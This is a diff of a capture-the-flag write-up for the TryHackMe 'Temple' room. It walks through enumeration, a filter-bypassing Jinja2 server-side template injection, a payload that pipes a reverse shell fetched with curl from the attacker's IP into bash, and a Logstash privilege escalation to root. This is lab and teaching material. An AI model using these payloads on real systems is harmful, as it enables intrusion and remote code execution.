@@ -1,22 +1,35 @@
-**Temple - Hard**
+---
+title: Temple TryHackMe Hard
+date: 2023-07-07 13:37:00 +0100
+categories: [TryHackMe, Web]
+tags: [flask,werkzeug,python,ctf,thm,tryhackme,ssti,pspy64]
+img_path: /thm/temple/img/
+image:
+  src: profile.png
+  width: 1000   # in pixels
+  height: 400   # in pixels
+---
+
+#Temple - Hard
 
 **Category: Security, Web, Hacking, Flask**
 
-**URL: https://tryhackme.com/room/temple**
+URL: https://tryhackme.com/room/temple
 
-  
 
-**Thoughts about the challenge before starting the challenge.**
+
+#Thoughts about the challenge before starting the challenge.
 
 When looking at the task, based on the name and the categories, it is most likely a Server-Side Template Injection (SSTI) vulnerability that will be exploited.
 Python Werkzeug Flask is well known in CTFs to contain SSTI vulnerability, and the name of the challenge also hints at the T in the SSTI.
 The difficulty of the challenge could be based on how hard it is to find the vulnerability, if it is hard to exploit, bypassing of filters, and as well the difficulty of the privilege escalation.
 
 
-**Process for obtaining Flag1.txt:**
+#Process for obtaining Flag1.txt:
 
-**Open ports and services:**
+##Open ports and services:
 ````
+nmap -T4 -A -p- -Pn IP
 7 echo: this service only echoes back what is being sent to it.
 21 ftp - 22 ssh - 23 telnet: not leaking any sensitive data and would be time-consuming to brute force.
 80 Apache HTTP: Not more than the default Apache site.
@@ -30,7 +43,7 @@ The source code does not leak any other paths.
 
 The login form is tested with simple SQLi and more advanced, as well as the automatization tool sqlmap without any signs of SQLi vulnerability.
 
-
+## Directory and file discovery with ffuf
 Next is file and directory discovery through fuzzing.
 Because this is a Flask web application, the fuzzing would be done without extensions.
 Initially, I would always use a short wordlist with common names.
@@ -66,11 +79,12 @@ This resulted from a slow service and a low amount of threads.
 200 - /temporary/dev/newacc
 ````
 
-The endpoint found is an endpoint where we could create an account.
+## Exploring newacc and the user portal
+The endpoint found ````/temporary/dev/newacc```` is used to create accounts for the web application.
 This only requires an ````email, username, and password```` where the username must be longer than ````5```` and the password longer than ````8````.
 After creating the account, we could login to the user portal, which gives access to the paths with the ````302 code````.
 
-
+## SSTI
 Under the path ````/account````, the representative account username is displayed.
 This is important to test further since it could display an SSTI vulnerability.
 By creating a new account with ````{{5*5}}```` as username, the username displayed when logged in should display ````25```` if it is vulnerable.
@@ -91,15 +105,13 @@ For this, I found this site through Google: https://hackmd.io/@Chivato/HyWsJ31dI
 
 
 **The one used was this**:
-````
-{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
-````
 
-This is still rejected because a hacking attempt was made, but based on the website, this should bypass most of the filters.
+````{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}````
+
+While this should bypass most filters, the SSTI command above was rejected.
 I tested the same but changed the ````'```` to, ````"```` and this was the last bypass needed.
-````
-{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("whoami")|attr("read")()}}
-````
+
+````{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("whoami")|attr("read")()}}````
 
 This gave the result in the username field of the account endpoint, ````bill````, which means that the ````bill```` user on the server is the user who owns the running service.
 This would also make the reverse shell identity ````bill```` after successful exploitation.
@@ -108,15 +120,14 @@ When testing basic reverse shells, it was either reported as a hacking attempt o
 Then I tested with a simple curl command to my IP and the listening port, which gave a hit.
 This means we could create a simple bash reverse shell in a file and then open a Python server, making the curl command possible to access the file.
 Therefore, changing ````whoami```` from the SSTI above to ````curl http://IP:port/reverseshellfile|bash```` would collect and execute the code.
-````
-{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl http://10.9.80.181/sstibypassshell|bash")|attr("read")()}}
-````
+
+````{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl http://10.9.80.181/sstibypassshell|bash")|attr("read")()}}````
 
 After inserting this as the username and creating the account, a reverse shell is spawned when accessing the ````/account```` path.
 This gave foothold as ````bill````, and the first flag was found under ````/home/bill/flagg1.txt````.
 
 
-**Useful commands for a better shell:**
+#Useful commands for a better shell:
 ````
 1. on the target: python3 -c 'import pty;pty.spawn("/bin/bash")'
 2. on the target: export TERM=xterm
@@ -129,9 +140,9 @@ This would make it possible to arrow up for earlier commands, clear to clear the
 The terminal is not being exited with ````CTRL + C````, making it possible to run other scripts on the target and use ````CTRL + C```` to exit that script and not the terminal reverse shell.
 
 
-**Process for obtaining Flag2.txt:**
+#Process for obtaining Flag2.txt:
 
-When enumerating for escalating possibilities, I always check manually at first before using auto scripts like Linpeas.
+When enumerating for privilege escalations, I always check manually at first before using auto scripts like Linpeas.
 This is because some escalations could often be found faster by one or multiple commands than by a script running multiple processes to gather critical information.
 For this, commands like ````netstat -tvlp```` to look for undiscovered open ports or locally open ports,
 ````find / -perm -4000 2>/dev/null```` to find SUID binaries which could be abused,
@@ -139,7 +150,7 @@ check directories like ````/home```` for which users we could privesc to, ````/o
 For running processes, I like to use ````pspy64```` since it would check live processes and spawning processes, which could give a cronjob run by root that could be used.
 Using ````ps```` for running processes could miss cronjobs being executed.
 
-
+## Vulnerble binary through writeable file
 When using the ````pspy64````, a binary: ````/usr/share/logstash/jdk/bin/java```` is being executed by root.
 Searching for logstash at hacktricks introduces us to a privilege escalation possibility.
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash
@@ -178,7 +189,7 @@ which means we could run this binary with the ````-p```` flag and have root priv
 This code is the one found at https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash , but with another command.
 
 
-**privesc exploit:**
+##privesc exploit:
 ````
 input {
   exec {  
@@ -198,7 +209,7 @@ output {
 The last flag is then found at ````/root/flag2.txt````.
 
 
-**More information:**
+#More information:
 
 We got access to the bill user based on the SSTI, but there were also found two other users, ````frankie```` and ````princess````.
 After the challenge was completed, there was found a possibility to crack the ````princess```` password based on the hash found in ````/etc/shadow````.
